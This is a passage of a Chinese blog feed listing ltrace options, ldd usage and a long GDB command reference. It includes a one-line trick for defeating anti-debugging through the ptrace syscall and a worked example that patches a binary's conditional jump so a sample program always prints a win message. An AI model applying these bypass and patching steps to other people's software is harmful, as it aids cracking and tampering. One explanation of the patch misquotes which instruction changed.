解码低级别名称（内核级）为用户级名称。<br>-d 打印调试信息。<br>-e 改变跟踪的事件。<br>-f 跟踪子进程。<br>-h 打印帮助信息。<br>-i 打印指令指针，当库调用时。<br>-l 只打印某个库中的调用。<br>-L 不打印库调用。<br>-n, --indent=NR 对每个调用级别嵌套以NR个空格进行缩进输出。<br>-o, --output=file 把输出定向到文件。<br>-p PID 附着在值为PID的进程号上进行ltrace。<br>-r 打印相对时间戳。<br>-s STRLEN 设置打印的字符串最大长度。<br>-S 显示系统调用。<br>-t, -tt, -ttt 打印绝对时间戳。<br>-T 输出每个调用过程的时间开销。<br>-u USERNAME 使用某个用户<span class="hljs-built_in">id</span>或组ID来运行命令。<br>-V, --version 打印版本信息，然后退出。<br></code></pre></td></tr></table></figure><h2 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.cnblogs.com/machangwei-8/p/10388938.html">https://www.cnblogs.com/machangwei-8/p/10388938.html</a></p><h1 id="ldd"><a href="#ldd" class="headerlink" title="ldd"></a>ldd</h1><p>这个命令用来查看进程使用的动态链接库。ldd不是一个可执行程序，而只是一个shell脚本</p><h2 id="常见的参数使用"><a href="#常见的参数使用" class="headerlink" title="常见的参数使用"></a>常见的参数使用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ldd /usr/bin/ls<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ldd -v /usr/bin/ls<br></code></pre></td></tr></table></figure><p>查看所有信息</p><p>输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">/opt/app/todeav1/test<span class="hljs-variable">$ldd</span> <span class="hljs-built_in">test</span><br>libstdc++.so.6 =&gt; /usr/lib64/libstdc++.so.6 (0x00000039a7e00000)<br>libm.so.6 =&gt; /lib64/libm.so.6 (0x0000003996400000)<br>libgcc_s.so.1 =&gt; /lib64/libgcc_s.so.1 (0x00000039a5600000)<br>libc.so.6 =&gt; /lib64/libc.so.6 (0x0000003995800000)<br>/lib64/ld-linux-x86-64.so.2 (0x0000003995400000)<br></code></pre></td></tr></table></figure><p>解释：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">第一列：程序需要依赖什么库<br>第二列: 系统提供的与程序需要的库所对应的库<br>第三列：库加载的开始地址<br></code></pre></td></tr></table></figure><h2 id="参考资料-2"><a href="#参考资料-2" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://linuxtools-rst.readthedocs.io/zh-cn/latest/tool/ldd.html">https://linuxtools-rst.readthedocs.io/zh-cn/latest/tool/ldd.html</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GDB常用命令</title>
    <link href="/2023/11/22/GDB%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2023/11/22/GDB%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>如何使用GDB进行调试</p><span id="more"></span><h2 id="GCC概述"><a href="#GCC概述" class="headerlink" title="GCC概述"></a>GCC概述</h2><p><strong>GNU 编译器套件</strong>（<strong>GCC</strong>，_GNU Compiler Collection_）最初的目标是作为一款 GNU 操作系统的通用编译器，包含有 C、C++、Objective-C、Objective-C++、Fortran、Ada、Go、BRIG(HSAIL)等语言的前端及其相关的<code>libstdc++</code>、<code>libgcj</code>等库，目前已经移植到 Windows、Mac OS X 等商业化操作系统。GCC 编译器套件当中包含了诸多的软件包，主要的软件包如下面表格所示：</p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td><em>cpp</em></td><td>C 预处理器。</td></tr><tr><td><em>gcc</em></td><td>C 编译器。</td></tr><tr><td><em>g++</em></td><td>C++ 编译器。</td></tr><tr><td><em>gccbug</em></td><td>用于创建 BUG 报告的 Shell 脚本。</td></tr><tr><td><em>gcov</em></td><td>覆盖测试工具，用于分析程序需要优化的位置。</td></tr><tr><td><em>libgcc</em></td><td>GCC 运行库。</td></tr><tr><td><em>libstdc++</em></td><td>标准 C++库。</td></tr><tr><td><em>libsupc++</em></td><td>C++语言支持函数库。</td></tr></tbody></table><p>Ubuntu、Mint 等使用 deb 格式软件包的 Linux 发行版通常会默认安装 GCC 编译器，但是由于相关的软件包可能并不完整，因此可以通过如下命令安装完整的 GCC 编译环境。</p><h2 id="文件分析指令"><a href="#文件分析指令" class="headerlink" title="文件分析指令"></a>文件分析指令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">file xxx  <span class="hljs-comment"># 查看文件格式信息</span><br><br>size *.o   <span class="hljs-comment"># 查看ELF各个段的长度</span><br><br>objdump -h *.o <span class="hljs-comment"># 查看目标文件结构和信息 -h(段信息) -sd(以16进制打印并且反汇编)</span><br><br>readelf -S *.o <br><br>nm *.o   <span class="hljs-comment"># 查看符号表</span><br><br>c++filt <span class="hljs-string">&quot;符号名&quot;</span> <span class="hljs-comment"># 还原经过mangling后名称</span><br><br></code></pre></td></tr></table></figure><h2 id="一、信息显示"><a href="#一、信息显示" class="headerlink" title="一、信息显示"></a>一、信息显示</h2><p>1、显示gdb版本 (gdb) show version</p><p>2、显示gdb版权 (gdb) show version or show warranty</p><p>3、启动时不显示提示信息gdb -q exe 或者.bashrc 添加alias gdb&#x3D;”gdb -q”，重启shell</p><p>4、退出时不显示提示信息(gdb) set confirm off</p><p>5、输出信息多时不会暂停输出(gdb)set pagination off</p><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">break</span>/b 设置断点(函数名，代码行，a.cpp:20)<br>delete n 删除第n个断点<br>info b  显示设置的断点<br>delete breakpoints 删除所有断点<br><span class="hljs-built_in">set</span> args ... 设置程序参数<br>run/r  开始运行<br><span class="hljs-built_in">continue</span>/c 执行到下一个断点<br>next/n 下一行，遇到函数不会进入 n 3 向下运行三步<br>step/s 下一步，遇到函数会进入<br>backtrace/bt  回溯出问题的调用<br>f x  frame x 这个是显示编号为x的栈帧信息<br><span class="hljs-keyword">until</span>  运行到退出该函数体<br>finish 运行到当前函数返回，并打印堆栈地址和返回值，这个的简写是fin。而不是f。<br><br>list/l 默认显示10行代码<br>list 行号  显示以行号为中心的前后10行代码<br>list 函数名<br>list 不带参数则接上次list继续显示剩下的<br><br><span class="hljs-built_in">print</span>/p<br></code></pre></td></tr></table></figure><h2 id="二、函数"><a href="#二、函数" class="headerlink" title="二、函数"></a>二、函数</h2><p>1、列出函数的名字(gdb) info functions</p><p>2、是否进入待调试信息的函数(gdb)step s</p><p>3、进入不带调试信息的函数(gdb)set step-mode on</p><p>4、退出正在调试的函数(gdb)return expression 或者 (gdb)finish</p><p>5、直接执行函数(gdb)start 函数名 call函数名</p><p>6、打印函数堆栈帧信息(gdb)info frame or i frame</p><p>7、查看函数寄存器信息(gdb)i registers</p><p>8、查看函数反汇编代码(gdb)disassemble func</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gdb">disas &lt;func&gt; 反汇编指定函数<br><br>disas &lt;addr&gt; 反汇编某地址所在函数<br><br>disas &lt;begin_addr&gt; &lt;end_addr&gt; 反汇编从开始地址到结束地址的部分<br></code></pre></td></tr></table></figure><p>9、打印尾调用堆栈帧信息(gdb)set debug entry-values 1</p><p>10、选择函数堆栈帧(gdb)frame n</p><p>11、向上或向下切换函数堆栈帧(gdb)up n down n</p><h2 id="三、断点"><a href="#三、断点" class="headerlink" title="三、断点"></a>三、断点</h2><p>1、在匿名空间设置断点(gdb)b Foo::foo (gdb) b (anonymous namespace)::bar</p><p>2、在程序地址上打断点(gdb)b address (gdb) b 0x400522</p><p>3、在程序入口处打断点stripa.out<br>readelf -h a.out或者(gdb)info files定位Entry point: 0x400440 (gdb)b *0x400440</p><p>4、在文件行号上打断点(gdb)b linenum (gdb)b file.cpp:linenum (gdb)info breakpoints</p><p>5、保存已经设置的断点(gdb)save breakpoints file-breakpoints-to-save (gdb)source file-breakpoints-to-save</p><p>6、设置临时断点(gdb)tbreak linenum</p><p>7、设置条件断点(gdb)b linenum if cond b 11 if i&#x3D;&#x3D;10</p><p>8、忽略断点(gdb)ignore bnum count</p><p>9、反向步进程序，直到到达另一个源码行的开头。</p><pre><code class="hljs">reverse-step [N] 参数 N 表示执行 N 次（或由于另一个原因直到程序停止）。</code></pre><p>10、reverse-next<br>反向步进程序，执行完子程序调用。</p><pre><code class="hljs">reverse-next [N]如果要执行的源代码行调用子程序，则此命令不会进入子程序，调用被视为一个指令。</code></pre><h2 id="四、观察点"><a href="#四、观察点" class="headerlink" title="四、观察点"></a>四、观察点</h2><p>1、设置观察点(gdb)watch a wacth (type)adress info watchpoints disable、enable、delete</p><p>2、设置观察点只针对特定线程生效(gdb)info threads watch expr thread threadnum wa a thread 2</p><p>3、设置读观察点(gdb)rwatch</p><p>4、设置读写观察点(gdb)awacth</p><h2 id="五、Catchpoint"><a href="#五、Catchpoint" class="headerlink" title="五、Catchpoint"></a>五、Catchpoint</h2><p>1、让catchpoint只触发一次(gdb)tcatch</p><p>2、为fork调用设置catchpoint (gdb)catch fork</p><p>3、为vfork调用设置catchpoint (gdb)catch vfork</p><p>4、为exec调用设置catchpoint (gdb)catch exec</p><p>5、为系统调用设置catchpoint (gdb)catch syscall name or num</p><p>6、通过ptrace调用设置catchpoint破解anti-debugging的程序 (gdb)catch syscall ptrace set $rax&#x3D;0</p><h2 id="八、core-dump文件"><a href="#八、core-dump文件" class="headerlink" title="八、core dump文件"></a>八、core dump文件</h2><p>1、为调试进程产生core dump文件(gdb)generate-core-file or gcore</p><p>2、加载可执行程序和core dump文件(gdb)gdb -q &#x2F;data&#x2F;nan&#x2F;a &#x2F;var&#x2F;core&#x2F;core.a.22268.1402638140</p><h2 id="九、汇编"><a href="#九、汇编" class="headerlink" title="九、汇编"></a>九、汇编</h2><p>1、设置汇编指令格式(gdb)set disassembly-flavor intel disassemble main</p><p>2、在函数的第一条汇编指令打断点(gdb)b *main</p><p>3、自动反汇编后面要执行的代码(gdb)set disassemble-next-line on<br>set disassemble-next-line auto set disassemble-next-line off</p><p>4、将源程序和汇编指令映射起来(gdb)disas &#x2F;m main</p><p>5、显示将要执行的汇编指令(gdb)display &#x2F;i $pc</p><p>6、打印寄存器的值(gdb)i registers <code>i all-registers</code> i registers eax</p><p>7、显示程序原始机器码(gdb)disassemble &#x2F;r main</p><h2 id="十、改变程序执行顺序"><a href="#十、改变程序执行顺序" class="headerlink" title="十、改变程序执行顺序"></a>十、改变程序执行顺序</h2><p>1、改变字符串的值(gdb)set main::p1&#x3D;”Jil”</p><p>2、设置变量的值(gdb)set var variable&#x3D;expr set var i &#x3D; 8 set {int}0x8047a54 &#x3D; 8 set var eax&#x3D;83、修改PC寄存器的值(gdb)p<br>pc set var $pc&#x3D;0x08050949</p><p>4、跳转到指定位置执行(gdb)j 15</p><p>5、使用断点命令改变程序的执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) b drawing Breakpoint 1 at 0x40064d: file win.c, line 6.<br>(gdb) <span class="hljs-built_in">command</span> 1<br>Type commands <span class="hljs-keyword">for</span> breakpoint(s) 1, one per line.<br>End with a line saying just “end”.<br>&gt;silent<br>&gt;<span class="hljs-built_in">set</span> variable n = 0<br>&gt;<span class="hljs-built_in">continue</span><br>&gt;end<br>(gdb) r<br></code></pre></td></tr></table></figure><p>6、修改被调试程序的二进制文件gdb -write .&#x2F;a.out (gdb)show write set write on disassemble &#x2F;mr drawing set variable (short)0x400651&#x3D;0x0ceb disassemble &#x2F;mr drawing</p><h2 id="十一、信号"><a href="#十一、信号" class="headerlink" title="十一、信号"></a>十一、信号</h2><p>1、查看信号处理信息(gdb)i signals</p><p>2、信号发生时是否暂停程序(gdb) handle signal stop&#x2F;nostop</p><p>3、信号发生时是否打印信号信息(gdb)handle signal print&#x2F;noprint</p><p>4、信号发生时是否把信息丢给程序处理(gdb)handle signal pass(noignore)&#x2F;nopass(ignore)</p><p>5、给程序发送信息(gdb)signal signal_name</p><p>6、使用”siginfo”变量(gdb)ptype<br>_siginfo</p><h2 id="十二、共享库"><a href="#十二、共享库" class="headerlink" title="十二、共享库"></a>十二、共享库</h2><p>1、显示共享连接库信息(gdb)info sharedlibrary regex</p><h2 id="十三、脚本"><a href="#十三、脚本" class="headerlink" title="十三、脚本"></a>十三、脚本</h2><p>1、配置gdb init文件(gdb) home目录下的 .gdbinit</p><p>2、按何种方式解析脚本文件(gdb)set script-extension off soft strict</p><p>3、保存历史命令(gdb)set history filename ~&#x2F;.gdb_history set<br>history save on</p><h2 id="十四、源文件"><a href="#十四、源文件" class="headerlink" title="十四、源文件"></a>十四、源文件</h2><p>1、设置源文件查找路径(gdb)directory ..&#x2F;ki&#x2F;</p><p>2、替换查找源文件的目录(gdb)set substitute-path from to</p><h2 id="十五、图形化界面"><a href="#十五、图形化界面" class="headerlink" title="十五、图形化界面"></a>十五、图形化界面</h2><p>1、进入和退出图形化调试界面(gdb)gdb -tui program</p><p>2、显示汇编代码窗口(gdb)layout asm</p><p>3、显示寄存器窗口(gdb)layout regs</p><p>4、调整窗口大小(gdb)winheight [+ | -]count</p><h2 id="十六、其它"><a href="#十六、其它" class="headerlink" title="十六、其它"></a>十六、其它</h2><p>1、命令行选项的格式(gdb)gdb -help</p><p>2、支持预处理器宏信息(gdb)gcc -g3</p><p>3、使用命令的缩写形式(gdb)b -&gt; break</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs txt">c -&gt; continue<br>d -&gt; delete<br>f -&gt; frame<br>i -&gt; info<br>j -&gt; jump<br>l -&gt; list<br>n -&gt; next<br>p -&gt; print<br>r -&gt; run<br>s -&gt; step<br>u -&gt; until<br>aw -&gt; awatch<br>bt -&gt; backtrace<br>dir -&gt; directory<br>disas -&gt; disassemble<br>fin -&gt; finish<br>ig -&gt; ignore<br>ni -&gt; nexti<br>rw -&gt; rwatch<br>si -&gt; stepi<br>tb -&gt; tbreak<br>wa -&gt; watch<br>win -&gt; winheight<br></code></pre></td></tr></table></figure><p>4、在gdb中执行shell命令和make(gdb)shell ls</p><p>5、在gdb中执行cd和pwd命令(gdb)pwd cd tmp</p><p>6、设置命令提示符(gdb)gdb -q &#96;which gdb</p><p>7、设置被调试程序的参数(gdb)gdb -args .&#x2F;a.out a b c set args a b c r a b</p><p>8、设置被调试程序的环境变量(gdb)set env varname&#x3D;value</p><p>9、得到命令的帮助信息(gdb)help</p><p>10、记录执行gdb的过程(gdb)set logging file log.txt set logging on</p><h2 id="查询运行信息"><a href="#查询运行信息" class="headerlink" title="查询运行信息"></a>查询运行信息</h2><p>where&#x2F;bt ：当前运行的堆栈列表；</p><p>bt backtrace 显示当前调用堆栈</p><p>up&#x2F;down 改变堆栈显示的深度</p><p>set args 参数:指定运行时的参数</p><p>show args：查看设置好的参数</p><p>info program： 来查看程序的是否在运行，进程号，被暂停的原因。</p><h2 id="分割窗口"><a href="#分割窗口" class="headerlink" title="分割窗口"></a>分割窗口</h2><p>layout：用于分割窗口，可以一边查看代码，一边测试：</p><p>layout src：显示源代码窗口</p><p>layout asm：显示反汇编窗口</p><p>layout regs：显示源代码&#x2F;反汇编和CPU寄存器窗口</p><p>layout split：显示源代码和反汇编窗口</p><p>Ctrl + x，再按1：单窗口模式，显示一个窗口</p><p>Ctrl + x，再按2：双窗口模式，显示两个窗口</p><p>Ctrl + x，再按a：回到传统模式，即退出layout，回到执行layout之前的调试窗口。</p><p>Ctrl + L：刷新窗口，每当窗口显示不正常的时候都可以使用此组合键刷新。</p><h2 id="关于反向执行程序"><a href="#关于反向执行程序" class="headerlink" title="关于反向执行程序"></a>关于反向执行程序</h2><p>其实在gdb中是可以反向执行程序的, 使用命令<code>record</code>或者是<code>record btrace</code>开启支持.开启后相关的命令如下: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">reverse-continue [ignore-count]    <br>rc [ignore-count]  <br>```   <br>从程序上次停止的位置开始，开始反向执行。反向执行会因断点和同步异常（信号）而停止，就像正常执行一样。异步信号的行为取决于目标环境。<br><br>```bash<br>reverse-step [count]<br><br>reverse-stepi [count]<br></code></pre></td></tr></table></figure><p>这个命令和<code>step</code>一样, 只是执行的方向相反, 这个是向后执行直到达到了不同源代码的开头, 其实</p><p>这个命令和上一个一样就是<code>si</code>命令的反方向版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">reverse-next [count]<br><br>reverse-nexti [count]<br></code></pre></td></tr></table></figure><p>这个命令就是<code>next</code>和<code>nexti</code>的反向版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">reverse-finish<br></code></pre></td></tr></table></figure><p><code>finish</code>的反向版本,正如 <code>finish</code> 命令将您带到当前函数返回的位置， <code>reverse-finish</code> 将您带到调用它的位置</p><h2 id="修改目标的二进制文件"><a href="#修改目标的二进制文件" class="headerlink" title="修改目标的二进制文件"></a>修改目标的二进制文件</h2><p>在默认情况下gdb是以只读模式打开目标文件的,但是可以通过一下命令开启写权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb --write ./a.out<br><br><span class="hljs-comment"># 或者是在gdb中进行更改</span><br>$ <span class="hljs-built_in">set</span> write on<br>$ file ./a.out <span class="hljs-comment"># 重新加载程序</span><br>$ show write <span class="hljs-comment"># 查看是否正确开启了write</span><br></code></pre></td></tr></table></figure><p>下面通过一个例子来说明使用方法:<br>这是程序的反汇编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs asm">(gdb) disassemble /mr drawing<br>Dump of assembler code for function drawing:<br>5       &#123;<br>   0x000000000040064d &lt;+0&gt;:     55      push   %rbp<br>   0x000000000040064e &lt;+1&gt;:     48 89 e5        mov    %rsp,%rbp<br>   0x0000000000400651 &lt;+4&gt;:     48 83 ec 10     sub    $0x10,%rsp<br>   0x0000000000400655 &lt;+8&gt;:     89 7d fc        mov    %edi,-0x4(%rbp)<br><br>6               if(n != 0)<br>   0x0000000000400658 &lt;+11&gt;:    83 7d fc 00     cmpl   $0x0,-0x4(%rbp)<br>   0x000000000040065c &lt;+15&gt;:    74 0c   je     0x40066a &lt;drawing+29&gt;<br><br>7                       puts(&quot;Try again?\nAll you need is a dollar, and a dream&quot;);<br>   0x000000000040065e &lt;+17&gt;:    bf 90 07 40 00  mov    $0x400790,%edi<br>   0x0000000000400663 &lt;+22&gt;:    e8 88 fe ff ff  callq  0x4004f0 &lt;puts@plt&gt;<br>   0x0000000000400668 &lt;+27&gt;:    eb 0a   jmp    0x400674 &lt;drawing+39&gt;<br><br>8               else<br>9                       puts(&quot;You win $3000!&quot;);<br>   0x000000000040066a &lt;+29&gt;:    bf c1 07 40 00  mov    $0x4007c1,%edi<br>   0x000000000040066f &lt;+34&gt;:    e8 7c fe ff ff  callq  0x4004f0 &lt;puts@plt&gt;<br><br>10      &#125;<br>   0x0000000000400674 &lt;+39&gt;:    c9      leaveq <br>   0x0000000000400675 &lt;+40&gt;:    c3      retq   <br><br>End of assembler dump.<br></code></pre></td></tr></table></figure><p>现在我们修改程序的二进制码:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> var *(short*)0x000000000040065c=0x0ceb <span class="hljs-comment"># 将0x000000000040065c地址上存储的数据设置成0x0ceb, 特别注意程序的大小端和指令长度</span><br></code></pre></td></tr></table></figure><p>重新查看反汇编码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs asm">(gdb) disassemble /mr drawing<br>Dump of assembler code for function drawing:<br>5       &#123;<br>   0x000000000040064d &lt;+0&gt;:     55      push   %rbp<br>   0x000000000040064e &lt;+1&gt;:     48 89 e5        mov    %rsp,%rbp<br>   0x0000000000400651 &lt;+4&gt;:     48 83 ec 10     sub    $0x10,%rsp<br>   0x0000000000400655 &lt;+8&gt;:     89 7d fc        mov    %edi,-0x4(%rbp)<br><br>6               if(n != 0)<br>   0x0000000000400658 &lt;+11&gt;:    83 7d fc 00     cmpl   $0x0,-0x4(%rbp)<br>   0x000000000040065c &lt;+15&gt;:    eb 0c   jmp    0x40066a &lt;drawing+29&gt;<br><br>7                       puts(&quot;Try again?\nAll you need is a dollar, and a dream&quot;);<br>   0x000000000040065e &lt;+17&gt;:    bf 90 07 40 00  mov    $0x400790,%edi<br>   0x0000000000400663 &lt;+22&gt;:    e8 88 fe ff ff  callq  0x4004f0 &lt;puts@plt&gt;<br>   0x0000000000400668 &lt;+27&gt;:    eb 0a   jmp    0x400674 &lt;drawing+39&gt;<br><br>8               else<br>9                       puts(&quot;You win $3000!&quot;);<br>   0x000000000040066a &lt;+29&gt;:    bf c1 07 40 00  mov    $0x4007c1,%edi<br>   0x000000000040066f &lt;+34&gt;:    e8 7c fe ff ff  callq  0x4004f0 &lt;puts@plt&gt;<br><br>10      &#125;<br>   0x0000000000400674 &lt;+39&gt;:    c9      leaveq <br>   0x0000000000400675 &lt;+40&gt;:    c3      retq   <br><br>End of assembler dump.<br>(gdb)<br></code></pre></td></tr></table></figure><p>可以看到<code>   0x0000000000400668 &lt;+27&gt;:    eb 0a   jmp    0x400674 &lt;drawing+39&gt;</code>变成了<code>jmp</code>从<code>je</code>.</p><h2 id="源文件的查找"><a href="#源文件的查找" class="headerlink" title="源文件的查找"></a>源文件的查找</h2><p><a href="https://ivanzz1001.github.io/records/post/cplusplus/2018/11/09/cpluscplus-gdbusage_part5#21-%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4%E4%BB%8B%E7%BB%8D">源文件的查找</a></p><h2 id="gdb热补丁"><a href="#gdb热补丁" class="headerlink" title="gdb热补丁"></a>gdb热补丁</h2><p>在调试大型程序时, 我们无法保证自己一次性找到了程序所有debug. 但是大型程序的编译、部署都需要耗费大量的时间, 所以gdb通过热补丁来弥补这一缺陷.</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ol><li>获取函数的返回值的方法：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#法一</span><br><span class="hljs-built_in">print</span> %eax<br><span class="hljs-comment">#法二</span><br>finish spec <span class="hljs-comment">#退出函数后会显示返回值，参数spec包括</span><br><span class="hljs-comment">#栈帧的编号</span><br><span class="hljs-comment">#栈帧的地址，可以通过info frame看到</span><br><span class="hljs-comment">#函数名称，如果该函数是一个递归函数，则有多个栈帧。查看的是编号最小的栈帧，也就是第一次执行这个函数栈帧。</span><br><br><span class="hljs-comment"># 与这个命令有关的命令包括：</span><br><br>up n <span class="hljs-comment">#这个命令是输出上n个栈帧，假设当前的栈帧编号是m，则这个命令是输出m+n号栈帧的信息</span><br><br>down n <span class="hljs-comment">#这个是输出下n个栈帧，和up命令一致，只是m-n</span><br></code></pre></td></tr></table></figure><ol start="2"><li><p>查看连续内存的方式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 可以使用GDB的&quot;@&quot;操作符查看连续内存，&quot;@&quot;的左边是第一个内存的地址的值，&quot;@&quot;的右边则你你想查看内存的长度。先要查看int arr[] = &#123;2, 4, 6, 8, 10&#125;</span><br><br>p *arr@3 <span class="hljs-comment">#查看3个成员</span><br></code></pre></td></tr></table></figure></li><li><p>查看函数参数、变量的值</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">info args #查看参数的值<br>info locals #查看函数中所有的变量的值<br><br><br></code></pre></td></tr></table></figure><p>举例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">func</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span>&#123;<br>    <span class="hljs-keyword">if</span>(num==<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> num*func(num<span class="hljs-number">-1</span>);<br>    &#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">5</span>;<br>    <span class="hljs-type">int</span> result = func(n);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d! = %d&quot;</span>,n,result);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>调试这个程序</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 